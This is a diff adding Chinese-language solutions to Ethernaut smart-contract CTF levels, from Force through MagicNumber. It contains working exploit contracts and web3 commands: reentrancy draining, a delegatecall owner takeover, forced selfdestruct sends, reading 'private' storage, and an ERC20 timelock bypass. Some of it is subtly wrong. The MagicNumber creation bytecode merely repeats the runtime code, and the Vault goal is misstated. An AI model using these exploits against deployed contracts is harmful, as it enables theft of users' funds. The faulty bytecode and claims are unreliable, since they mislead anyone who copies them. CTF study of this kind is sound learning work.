@@ -326,3 +326,783 @@ if (result) {
         }
 ```
 这段代码似乎无用？
+
+# Force
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Force { /*
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+    /~____  =ø= /
+    (______)__m_m)
+                   */ }
+```
+对于一个空合约，没有收款函数，咋一看好像无法转账。在 Solidity 中，通常合约通过 payable 函数接收资金。然而，Force 合约并没有实现任何 payable 函数，这意味着你不能直接通过调用该合约的函数来转账以使合约余额增加。即使合约本身没有 payable 函数，依然可以通过其他方式向合约发送以太币。例如，利用自毁（selfdestruct）的机制，强制向合约地址发送以太币。selfdestruct 会销毁调用的合约，并将合约的剩余余额转移到指定的地址。
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attack {
+    function attack() public payable {
+        selfdestruct(payable(address(0x001EFC76D2c63Bc20C4bA266333c76DE2803c7A1)));
+    }
+}
+```
+
+# Vault
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Vault {
+    bool public locked;
+    bytes32 private password;
+
+    constructor(bytes32 _password) {
+        locked = true;
+        password = _password;
+    }
+
+    function unlock(bytes32 _password) public {
+        if (password == _password) {
+            locked = false;
+        }
+    }
+}
+```
+- 目标是让 locked = true。虽然密码被声明为私有变量（private），但在以太坊智能合约中，合约的所有数据都是公开存储在区块链上的，所谓的“私有”只是指无法通过合约的接口直接访问。但我们可以通过区块链浏览器或其他调试工具，读取合约的存储状态，从而找到 password 的真实值。
+- 我们知道 password 是一个私有的 bytes32 类型的变量，存储在合约的状态变量中。根据 Solidity 的存储布局规则，password 变量会存储在某个固定的槽位中。使用 `web3.eth.getStorageAt(contractAddress, index)` 可以读取这个值。
+
+```js
+await web3.eth.getStorageAt(instance, 1)
+// 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
+await web3.eth.getStorageAt(instance, 1).then(web3.utils.toAscii)
+// A very strong secret password :)
+// 补充： 通过 web3.utils.toAscii / web3.utils.toHex 可以转为可见字符或者/bytes
+await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
+```
+
+# King
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+    address king;
+    uint256 public prize;
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    receive() external payable {
+        require(msg.value >= prize || msg.sender == owner);
+        payable(king).transfer(msg.value);
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    function _king() public view returns (address) {
+        return king;
+    }
+}
+```
+合约通过发送超过当前 prize 的以太坊成为“国王”（king），而被推翻的国王将获得 prize 的奖励。这是一种类似于庞氏骗局的游戏机制，游戏的设计鼓励参与者不断增加 prize 以争夺国王的位置。
+攻击目标是破坏这个合约，即在成为新的国王后，其他人也不能通过发送更高的 prize 夺取国王的位置。并且 submit 时也会尝试夺权，如果夺权失败则通关。
+- 合约中的潜在问题在于：当新的国王被推翻时，旧的国王会收到 prize。如果接收 prize 的操作失败，receive() 函数中的流程就会失败，国王位置将不会被更新。因此，可以利用一种方式阻止国王接收 prize，从而阻止其他人替代国王。部署一个智能合约，该合约的 receive() 函数拒绝接受以太坊，从而导致 King 合约在调用 payable(king).transfer() 时失败。
+
+```js
+// 查看当前 prize
+(await contract.prize()).toNumber()
+```
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attack {
+    address payable kingContract;
+
+    constructor(address payable _kingContract) payable {
+        kingContract = _kingContract;
+    }
+
+    function attack() public payable {
+        // 向 King 合约发送超过当前 prize 的以太坊，成为国王
+        (bool success, ) = kingContract.call{value: msg.value}("");
+        require(success, "Attack failed");
+    }
+
+    // 通过阻止接收以太坊来破坏 King 合约
+    receive() external payable {
+        revert("Cannot become king");
+    }
+}
+```
+
+# Re-entrancy
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import "openzeppelin-contracts-06/math/SafeMath.sol";
+
+contract Reentrance {
+    using SafeMath for uint256;
+
+    mapping(address => uint256) public balances;
+
+    function donate(address _to) public payable {
+        balances[_to] = balances[_to].add(msg.value);
+    }
+
+    function balanceOf(address _who) public view returns (uint256 balance) {
+        return balances[_who];
+    }
+
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] >= _amount) {
+            (bool result,) = msg.sender.call{value: _amount}("");
+            if (result) {
+                _amount;
+            }
+            balances[msg.sender] -= _amount;
+        }
+    }
+
+    receive() external payable {}
+}
+```
+
+这道题是经典的重入漏洞；Reentrance 合约的 withdraw 函数在确保调用者有足够余额后，会将资金发送到调用者的地址。关键是在发送资金和更新余额之间，由于使用 call 方法，合约允许调用者的回退（fallback）方法执行，从而可能再次调用 withdraw 函数。如果回退方法中再次调用 withdraw，并且合约状态尚未更新，这将导致重入攻击。
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.12;
+
+interface IReentrance {
+    function donate(address _to) external payable;
+    function withdraw(uint _amount) external;
+}
+
+contract Attack {
+    IReentrance public victimContract = IReentrance(0xFd0d5031eA1e5169a6C080a30069042a10CbC59b);
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    receive() external payable {
+        if (address(victimContract).balance >= 0.001 ether) {
+            victimContract.withdraw(0.001 ether);
+        } else if (address(victimContract).balance > 0 ether){ // 这里后面修改了一下，就不会出 out of gas 的问题，但 out of gas 也会攻击成功
+            victimContract.withdraw(address(victimContract).balance);
+        }
+    }
+
+    function attack() public payable {
+        victimContract.donate{value: 0.001 ether}(address(this));
+        victimContract.withdraw(0.001 ether);
+    }
+
+    function getFunds() public {
+       payable(owner).transfer(address(this).balance);
+    }
+}
+```
+Attack 的时候传 0.001 ether 即可。
+
+# Elevator
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
+```
+目标让 top 变成 true。下面这一段代码看起来是无法满足的，但 building 合约是自己控制的，可以在里面反转 isLastFloor 的返回值，先返回 false 然后返回 true。
+```solidity
+if (!building.isLastFloor(_floor)) {
+    floor = _floor;
+    top = building.isLastFloor(floor);
+}
+```
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IElevator {
+    function goTo(uint _floor) external;    
+}
+
+contract Attack {
+    IElevator public victimContract = IElevator(0xB85c9b8D0499B6D143675FF579755d2dEEaccDEa);
+    bool public toggle = true;
+
+    constructor(){}
+    
+    function isLastFloor(uint256) public returns (bool){
+        toggle = !toggle;
+        return toggle;
+    }
+
+    function attack() public payable {
+        victimContract.goTo(1);
+    }
+}
+```
+
+这个题 goTo 传多少都没意义，关键是控制 isLastFloor 返回符合目标合约的约束。
+
+# Privacy
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Privacy {
+    bool public locked = true;
+    uint256 public ID = block.timestamp;
+    uint8 private flattening = 10;
+    uint8 private denomination = 255;
+    uint16 private awkwardness = uint16(block.timestamp);
+    bytes32[3] private data;
+
+    constructor(bytes32[3] memory _data) {
+        data = _data;
+    }
+
+    function unlock(bytes16 _key) public {
+        require(_key == bytes16(data[2]));
+        locked = false;
+    }
+
+    /*
+    A bunch of super advanced solidity algorithms...
+
+      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
+      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
+      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
+      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
+      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
+    */
+}
+```
+目标是解锁这个合约。要解锁合约，我们需要找到一个 bytes16 的 _key，该密钥必须与 data[2] 的前 16 字节相同。也就是说，合约的解锁机制依赖于 data[2] 的内容。
+- 在 Solidity 中，状态变量是按顺序存储在合约的存储槽（slots）中的。每个存储槽的大小为 32 字节（256 位）。我们可以利用这一点通过读取合约的存储来获取 data[2] 的内容。以下是 Solidity 中变量的存储规则：
+    - 每个 uint256 或 bytes32 类型的变量独占一个存储槽。
+    - 较小的数据类型（如 uint8 和 uint16）可以合并存储在同一个槽中，直到占满 32 字节。
+- 存储布局分析：根据代码，变量的存储分布如下
+    - locked（bool 类型）占用第 0 槽的第 1 位。
+    - ID（uint256 类型）占用第 1 槽。
+    - flattening, denomination, 和 awkwardness（uint8 和 uint16 类型）会合并到第 2 槽。
+    - data[0], data[1], 和 data[2] 分别占用第 3、4、5 槽。
+    - 我们需要的是 data[2]，它位于存储槽 5 中。
+
+```js
+await web3.eth.getStorageAt("0xCe702b10A17D441216cdA807c7b93E6d787479c6", 5);
+// 0x9a7cc95f3d89c118afdf08eba0a9246c60140b408ab6c80594f28e79a9f97ed3
+"0x9a7cc95f3d89c118afdf08eba0a9246c60140b408ab6c80594f28e79a9f97ed3".slice(0,34) // include "0x"
+await contract.unlock("0x9a7cc95f3d89c118afdf08eba0a9246c")
+await contract.locked()
+```
+- bytes 类型表示一个定长或变长的字节数组。在 Solidity 中，字节数组从高位（即数组的开头）开始存储。当进行从大类型到小类型的转换时，bytes 是截取前面的字节（即高位部分）。bytes 数组是字节序列，按照大端字节序（big-endian）方式存储。大端表示法意味着最左边的字节是最高有效位，因此在截取时保留的是高位部分。
+- uint（无符号整数）类型表示一个数值，在内存中的表示方式是数值的二进制形式。当对 uint 进行类型转换时，Solidity 选择截取数值的低位，因为低位是数值的有效部分。
+
+# Gatekeeper One
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperOne {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+    }
+
+    modifier gateTwo() {
+        require(gasleft() % 8191 == 0);
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+        _;
+    }
+
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+    }
+}
+```
+- `gasLeft()`: [docs](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html#block-and-transaction-properties)
+```solidity
+modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+}
+```
+这个条件要求 msg.sender 不等于 tx.origin。这意味着你需要通过另一个合约来调用 GatekeeperOne 合约。
+```solidity
+modifier gateTwo() {
+    require(gasleft() % 8191 == 0);
+    _;
+}
+```
+这个条件要求在执行该modifier时剩余的gas量必须是 8191 的倍数。这个条件非常棘手，通过循环去不断尝试。
+```solidity
+modifier gateThree(bytes8 _gateKey) {
+    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+    _;
+}
+```
+`bytes 本身是大端序，如果 bytes 和 uint 进行类型转换，数据本身不会发生变化，但数据的解读方式需要按对方的方式来进行解读。` 这里的要求是构造一个特定的 bytes8 类型的 _gateKey，它需要通过以下三个条件：
+- 条件1：uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)) 这个条件要求 _gateKey 的低32位的前16位必须为0，以使得低32位的值等于低16位的值。
+- 条件2：uint32(uint64(_gateKey)) != uint64(_gateKey) 这个条件要求 _gateKey 的高32位必须不为零。换句话说，整个 _gateKey 必须大于 2^32，从而 uint32(uint64(_gateKey)) 和 uint64(_gateKey) 不相等。
+- 条件3：uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)) 这个条件要求 _gateKey 的低16位等于 tx.origin（交易发起者地址）的低16位。
+
+综上可以如下构造：
+```solidity
+bytes8 _gateKey = bytes8((uint32(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF)|0xFFFFFFFF00000000);
+```
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IGatekeeperOne {
+    function enter(bytes8 _gateKey) external returns(bool);
+}
+
+contract GatekeeperOneExploit {
+    IGatekeeperOne public gatekeeper = IGatekeeperOne(0x9aA2db5838cBEF21BD6bC21E465B5973e5155b68);
+
+    constructor() {}
+
+    function exploit() public {
+        bytes8 _gateKey = bytes8((uint32(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF)|0xFFFFFFFF00000000);
+        for (uint256 i = 0; i < 8191; i++) {
+            (bool success, ) = address(gatekeeper).call{gas: 8191 * 10 + i}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
+            if (success) {
+                break;
+            }
+        }
+    }
+}
+```
+
+# Gatekeeper Two
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperTwo {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+    }
+
+    modifier gateTwo() {
+        uint256 x;
+        assembly {
+            x := extcodesize(caller())
+        }
+        require(x == 0);
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
+        _;
+    }
+
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+    }
+}
+```
+题目相关资料：
+- [solidity cheatsheet](https://docs.soliditylang.org/en/v0.4.23/miscellaneous.html#cheatsheet)
+- [solidity assembly](https://docs.soliditylang.org/en/v0.4.23/assembly.html)
+
+gateOne 同理，通过代理合约即可。gateTwo 的 extcodesize, 它返回 caller() 的合约代码大小。
+```solidity
+modifier gateTwo() {
+        uint256 x;
+        assembly {
+            x := extcodesize(caller()) // 内联汇编，caller() 相当于 msg.sender()，extcodesize 用于获取指定地址上存储的合约代码大小
+        }
+        require(x == 0);
+        _;
+    }
+```
+- 要求调用者的合约代码大小为0，意味着在调用这个合约时，调用者合约还没有部署完整。在 Solidity 中，当合约构造函数正在执行时，合约的代码还没有完全部署，extcodesize 会返回0。因此，我们可以在合约的构造函数中完成对 GatekeeperTwo 的调用，绕过这一检查；
+- gateThree 看似复杂，但异或其实很简单：`_gateKey = uint64(keccak256(msg.sender)) ^ type(uint64).max`；
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IGatekeeperTwo {
+    function enter(bytes8 _gateKey) external returns(bool);
+}
+
+contract Attack {
+    IGatekeeperTwo public gatekeeper = IGatekeeperTwo(0xFC25F472366970CB5587aE22e4AACFbb02FBc589);
+
+    constructor() {
+        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
+        gatekeeper.enter(gateKey);
+    }
+}
+```
+
+# Naught Coin
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
+
+contract NaughtCoin is ERC20 {
+    // string public constant name = 'NaughtCoin'; // 调用父类构造函数传进去的
+    // string public constant symbol = '0x0'; // 调用父类构造函数传进去的
+    // uint public constant decimals = 18; // 这里的注释指的是 ERC20 的默认逻辑
+    uint256 public timeLock = block.timestamp + 10 * 365 days;
+    uint256 public INITIAL_SUPPLY;
+    address public player;
+
+    constructor(address _player) ERC20("NaughtCoin", "0x0") {
+        player = _player;
+        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals())); // decimals() 默认值18，这里是发放 1000000 枚token 的意思
+        // _totalSupply = INITIAL_SUPPLY;
+        // _balances[player] = INITIAL_SUPPLY;
+        _mint(player, INITIAL_SUPPLY); // 实现了上面注释的逻辑
+        emit Transfer(address(0), player, INITIAL_SUPPLY);
+    }
+
+    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
+        super.transfer(_to, _value);
+    }
+
+    // Prevent the initial owner from transferring tokens until the timelock has passed
+    modifier lockTokens() {
+        if (msg.sender == player) {
+            require(block.timestamp > timeLock);
+            _;
+        } else {
+            _;
+        }
+    }
+}
+```
+目标是将我的地址余额变为0。由于 transfer 被时间锁限制，我们需要找到一种可以绕过 transfer 函数的方式。这个题需要一些关于 ERC20 的背景知识：
+- ERC20 代码: [github](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.7/contracts/token/ERC20/ERC20.sol)
+- [ERC20-标准源代码-语法导读](https://github.com/SeeDAO-OpenSource/DEV-NoviceVillage/blob/master/1.%E7%BB%BC%E5%90%88%E6%80%A7%E7%90%86%E8%A7%A3/Token/ERC20-%E6%A0%87%E5%87%86%E6%BA%90%E4%BB%A3%E7%A0%81-%E8%AF%AD%E6%B3%95%E5%AF%BC%E8%AF%BB.md)
+
+阅读完上述材料后我们知道，除了 transfer，还有 approve 和 transferFrom。虽然合约限制了 transfer 函数，但并没有限制 approve 和 transferFrom 函数。ERC20 除了直接 transfer 之外，为了可组合性，还实现了授权转账功能。我们可以利用授权转账功能来绕过 token lock。
+
+```js
+await contract.approve(player, toWei("1000000"))
+await contract.transferFrom(player, instance, toWei("1000000"))
+```
+
+# Preservation
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Preservation {
+    // public library contracts
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+    uint256 storedTime;
+    // Sets the function signature for delegatecall
+    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
+        timeZone1Library = _timeZone1LibraryAddress;
+        timeZone2Library = _timeZone2LibraryAddress;
+        owner = msg.sender;
+    }
+    
+    // set the time for timezone 1
+    function setFirstTime(uint256 _timeStamp) public {
+        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+
+    // set the time for timezone 2
+    function setSecondTime(uint256 _timeStamp) public {
+        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+}
+
+// Simple library contract to set the time
+contract LibraryContract {
+    // stores a timestamp
+    uint256 storedTime;
+
+    function setTime(uint256 _time) public {
+        storedTime = _time;
+    }
+}
+```
+- 这道题的核心在于利用delegatecall的上下文保留机制，通过调用外部合约代码来操作当前合约的存储布局，从而实现攻击目标。delegatecall 修改的本质上是 Preservation 中的变量。
+
+首先需要理解 Preservation 合约的存储结构：
+- timeZone1Library - 存储在 slot 0
+- timeZone2Library - 存储在 slot 1
+- owner - 存储在 slot 2
+- storedTime - 存储在 slot 3
+
+在 LibraryContract 中，只有一个状态变量： storedTime - 存储在 slot 0。setTime 实际上修改的是 address public timeZone1Library。
+
+编写并部署一个恶意合约 MaliciousLibrary，该合约与 LibraryContract 有相同的函数签名 setTime(uint256)，但它将操作 Preservation 合约的存储槽 2（即 owner 变量），并将 owner 替换为攻击者的地址。
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract MaliciousLibrary {
+    function setTime(uint256) public {
+        address attacker = address(uint160(msg.sender));
+        assembly {
+            sstore(2, attacker) // sstore(slot, value)，使用 sstore 可以绕过 Solidity 对变量访问的限制，例如在没有声明对应的状态变量时直接修改存储槽的值。
+        }
+    }
+}
+```
+
+```js
+await contract.setFirstTime("0x6b14047235Ae884f97bb15aba68d40D951A2a9F7")
+await contract.timeZone1Library()
+// 0x6b14047235Ae884f97bb15aba68d40D951A2a9F7
+await contract.setFirstTime("0x6b14047235Ae884f97bb15aba68d40D951A2a9F7") // 随便传参数反正不会用
+await contrcat.owner()
+```
+- 除了上面的 sstore 之外，也可以在攻击合约里模仿 Preservation 的变量定义然后直接修改对应的 owner 变量；
+
+# Recovery
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Recovery {
+    //generate tokens
+    function generateToken(string memory _name, uint256 _initialSupply) public {
+        new SimpleToken(_name, msg.sender, _initialSupply);
+    }
+}
+
+contract SimpleToken {
+    string public name;
+    mapping(address => uint256) public balances;
+
+    // constructor
+    constructor(string memory _name, address _creator, uint256 _initialSupply) {
+        name = _name;
+        balances[_creator] = _initialSupply;
+    }
+
+    // collect ether in return for tokens
+    receive() external payable {
+        balances[msg.sender] = msg.value * 10;
+    }
+
+    // allow transfers of tokens
+    function transfer(address _to, uint256 _amount) public {
+        require(balances[msg.sender] >= _amount);
+        balances[msg.sender] = balances[msg.sender] - _amount;
+        balances[_to] = _amount;
+    }
+
+    // clean up after ourselves
+    function destroy(address payable _to) public {
+        selfdestruct(_to);
+    }
+}
+```
+要解决这个问题，我们需要从由 Recovery 合约部署的丢失的 SimpleToken 合约中取回 0.001 ether。关键步骤如下：
+- 理解合约地址如何生成：当一个合约使用 CREATE 操作码（在 Solidity 中通过 new 关键字）创建另一个合约时，新合约的地址是根据创建者的地址和他们当时的 nonce（交易次数）确定性计算出来的。
+- 计算丢失合约的地址：因为 SimpleToken 合约是 Recovery 合约创建的第一个（也是唯一一个）合约，所以当时的 nonce 是 1。我们可以利用这个信息和 Recovery 合约的地址来计算丢失的合约地址。
+```solidity
+function computeLostContractAddress(address _creator, uint _nonce) public pure returns (address) {
+    bytes memory data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _creator, uint8(_nonce));
+    bytes32 hash = keccak256(data);
+    return address(uint160(uint(hash)));
+}
+```
+或者
+```js
+const ethers = require('ethers');
+
+const recoveryAddress = '0xYourRecoveryContractAddress';
+const nonce = 1;
+
+const computedAddress = ethers.utils.getContractAddress({
+    from: recoveryAddress,
+    nonce: nonce
+});
+
+console.log('丢失的 SimpleToken 合约地址:', computedAddress);
+```
+- 与丢失的合约交互：一旦我们知道了地址，就可以与 SimpleToken 合约交互。由于 destroy 函数是公共的，我们可以调用它来触发 selfdestruct，将合约持有的以太币发送到我们指定的地址。
+
+此外，也可以在 etherscan 上找到合约地址：0xF8a061d1a76A071FB6c314609b0bb91A36C8Ee64 和上面的函数计算结果一致。
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ISimpleToken {
+    function destroy(address payable _to) external;
+}
+
+contract Attack {
+    function attack() public {
+        address payable to = payable(address(0xA5d69166aD38B3403FE7894B0FBDA83A6026767C));
+        ISimpleToken(payable(0xF8a061d1a76A071FB6c314609b0bb91A36C8Ee64)).destroy(to);
+    }
+}
+```
+
+补充：地址计算的 RLP 编码 keccack256(RLP_encode(address, nonce))，这里的 nonce 从 1 开始计算（因为合约自身创建 nonce 从变为了 1）
+```
+[
+  0xC0
+    + 1 (a byte for string length) 
+    + 20 (string length itself) 
+    + 1 (nonce), 
+  0x80
+    + 20 (string length),
+  <20 byte string>,
+  <1 byte nonce>
+]
+
+[0xD6, 0x94, <challengeInstance>, 0x01]
+```
+
+# MagicNumber
+- 这道题有点难，看 wp 学习的，不会手写 Opcode。
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract MagicNum {
+    address public solver;
+
+    constructor() {}
+
+    function setSolver(address _solver) public {
+        solver = _solver;
+    }
+
+    /*
+    ____________/\\\_______/\\\\\\\\\_____        
+     __________/\\\\\_____/\\\///////\\\___       
+      ________/\\\/\\\____\///______\//\\\__      
+       ______/\\\/\/\\\______________/\\\/___     
+        ____/\\\/__\/\\\___________/\\\//_____    
+         __/\\\\\\\\\\\\\\\\_____/\\\//________   
+          _\///////////\\\//____/\\\/___________  
+           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
+            ___________\///_____\///////////////__
+    */
+}
+```
+题目要求我们实现一个可以在 whatIsTheMeaningOfLife() 调用时返回正确的 32 字节数的合约【注释里提示了是42】，同时限制代码长度。这个题需要写一个 solver 合约，最多10字节（如果通过solidity写一个function也会超过10个字节）。题目提示我们需要离开 solidity 直接写 EVM Opcode 来满足功能。
+
+部署合约的字节码进一步可以分为：Creation Code（不包含进合约内，仅部署时执行）、Runtime Code。Constructor 中的逻辑就在 Creation Code。
+
+对于 Creation Code：
+- OPCODE: 0x60  NAME: PUSH1
+- OPCODE: 0x52  NAME: MSTORE
+- OPCODE: 0xf3  NAME: RETURN
+- OPCODE: 0x39  NAME: CODECOPY
+
+
+先构造 runtime code：目标是返回42即(0x2a),需要用到 return(p,s) 操作码，p是回传值在memory中的位置，s是回传值的大小，所以0x2a需要先存到memory中然后再return，于是用到 MSTORE(p,v)。
+```
+PUSH1 0x2a
+PUSH1 0x80 // 这里可以是任意值，通常 solidity 编译出的 opcode 这里是 0x80，因为之前的位置有别的用途，但手写 opcode 无所谓了
+MSTORE
+
+PUSH1 0x20 // 32 bytes - RETURN(p,s) - s - size
+PUSH1 0x80 // p - 上面 mstore 的地址
+RETURN
+```
+翻译成opcode：`602a60805260206080f3` 20 chars 刚好 10 bytes 
+
+然后写 creation code。需要完成的操作有：将 runtime code 加载到内存中，然后返回给 EVM。CODECOPY 操作码可以实现这个功能，CODECOPY(d,p,s) 需要三个参数：runtime code position in memory，current position of runtime opcode in the bytecode 和 size of the code in bytes。 回传给 EVM 需要用到： return(p,s);
+
+故构造如下：
+```
+PUSH1 s // 0x0a - 10 bytes - size of runtime opcode 和前面的 code 长度一致
+PUSH1 p // 
+PUSH1 d // dst position: 0x00 可以随便设
+CODECOPY
+// CODECOPY(d,p,s)
+PUSH1 s // 和上面一致 0x0a
+PUSH1 p // 和上面一致 0x00
+RETURN
+// return(p,s)
+```
+
+翻译成 bytecode:
+```
+602a60805260206080f3
+```
+组合一下：
+```
+602a60805260206080f3 + 602a60805260206080f3
+602a60805260206080f3602a60805260206080f3
+```
+
+部署：
+```solidity
+bytecode = "602a60805260206080f3602a60805260206080f3"
+txn = await web3.eth.sendTransaction({from: player, data: bytecode})
+await contract.setSolver(txn.contractAddress)
+```
+这里不止一种构造方式。
+
+参考资料：
+- [Learn EVM in depth #2. Executing the bytecode step by step in the deployment of a contract.](https://medium.com/coinmonks/learn-evm-in-depth-2-executing-the-bytecode-step-by-step-in-the-deployment-of-a-contract-270a6335df75)
+- [https://www.evm.codes/playground](https://www.evm.codes/playground)
